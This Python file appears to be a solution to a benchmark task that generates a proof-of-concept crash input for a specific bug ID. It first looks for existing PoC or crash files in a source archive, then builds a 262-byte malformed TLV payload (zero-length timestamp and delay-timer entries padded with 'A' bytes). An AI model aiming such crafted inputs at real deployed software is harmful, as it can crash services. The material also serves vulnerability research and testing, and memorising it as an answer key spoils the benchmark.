import os
import re
import tarfile


class Solution:
    def solve(self, src_path: str) -> bytes:
        BUG_ID = "385180600"
        TARGET_POC_LEN = 262

        def is_probably_binary(sample: bytes) -> bool:
            if not sample:
                return False
            if b"\0" in sample:
                return True
            control = 0
            high = 0
            for b in sample:
                if b > 0x7E:
                    high += 1
                elif b < 0x20 and b not in (9, 10, 13):
                    control += 1
            return (control + high) > len(sample) * 0.3

        with tarfile.open(src_path, "r:*") as tar:
            members = tar.getmembers()

            # Step 1: Directly look for a PoC file that contains the bug ID in its name
            best_member = None
            best_score = None

            for member in members:
                if not member.isfile():
                    continue
                base = os.path.basename(member.name).lower()
                if BUG_ID in base:
                    size = member.size
                    if size == 0:
                        continue
                    try:
                        f = tar.extractfile(member)
                        if f is None:
                            continue
                        sample = f.read(min(4096, size))
                    except Exception:
                        continue
                    binary = is_probably_binary(sample)
                    penalty = 0 if binary else 1000
                    diff = abs(size - TARGET_POC_LEN) + penalty
                    if best_member is None or diff < best_score:
                        best_member = member
                        best_score = diff

            if best_member is not None:
                f = tar.extractfile(best_member)
                if f is not None:
                    data = f.read()
                    if data:
                        return data

            # Step 2: Look for generic PoC/testcase/crash-style files
            keywords = ("poc", "pocs", "crash", "testcase", "oss-fuzz", "clusterfuzz")
            best_member = None
            best_score = None

            for member in members:
                if not member.isfile():
                    continue
                path_lower = member.name.lower()
                if not any(kw in path_lower for kw in keywords):
                    continue
                size = member.size
                if size == 0:
                    continue
                try:
                    f = tar.extractfile(member)
                    if f is None:
                        continue
                    sample = f.read(min(4096, size))
                except Exception:
                    continue
                if not is_probably_binary(sample):
                    continue
                diff = abs(size - TARGET_POC_LEN)
                if best_member is None or diff < best_score:
                    best_member = member
                    best_score = diff

            if best_member is not None:
                f = tar.extractfile(best_member)
                if f is not None:
                    data = f.read()
                    if data:
                        return data

            # Step 3: Fallback – synthesize a PoC based on TLV information in headers
            tlv_type_values = {}

            def extract_tlv_value(symbol: str) -> None:
                if symbol in tlv_type_values:
                    return
                pattern = re.compile(
                    r"\b" + re.escape(symbol) + r"\b\s*=\s*(0x[0-9A-Fa-f]+|\d+)"
                )
                for m in members:
                    if not m.isfile():
                        continue
                    base = os.path.basename(m.name)
                    if not base.endswith(
                        (".h", ".hpp", ".hh", ".hxx", ".inc", ".inl")
                    ):
                        continue
                    try:
                        f = tar.extractfile(m)
                        if f is None:
                            continue
                        text = f.read(40000).decode("utf-8", "ignore")
                    except Exception:
                        continue
                    mt = pattern.search(text)
                    if mt:
                        val = int(mt.group(1), 0)
                        tlv_type_values[symbol] = val
                        return

            for symbol in ("kActiveTimestamp", "kPendingTimestamp", "kDelayTimer"):
                extract_tlv_value(symbol)

            tlv_order = []
            if "kActiveTimestamp" in tlv_type_values:
                tlv_order.append(
                    ("kActiveTimestamp", tlv_type_values["kActiveTimestamp"])
                )
            if "kPendingTimestamp" in tlv_type_values:
                tlv_order.append(
                    ("kPendingTimestamp", tlv_type_values["kPendingTimestamp"])
                )
            if "kDelayTimer" in tlv_type_values:
                tlv_order.append(("kDelayTimer", tlv_type_values["kDelayTimer"]))

            if not tlv_order:
                tlv_order = [
                    ("kActiveTimestamp", 1),
                    ("kPendingTimestamp", 2),
                    ("kDelayTimer", 52),
                ]

            payload = bytearray()

            first_type = tlv_order[0][1] & 0xFF
            payload.append(first_type)
            payload.append(0)  # zero-length TLV value

            if len(payload) < TARGET_POC_LEN and len(tlv_order) > 1:
                second_type = tlv_order[1][1] & 0xFF
                payload.append(second_type)
                payload.append(0)

            while len(payload) < TARGET_POC_LEN:
                payload.append(0x41)

            return bytes(payload)
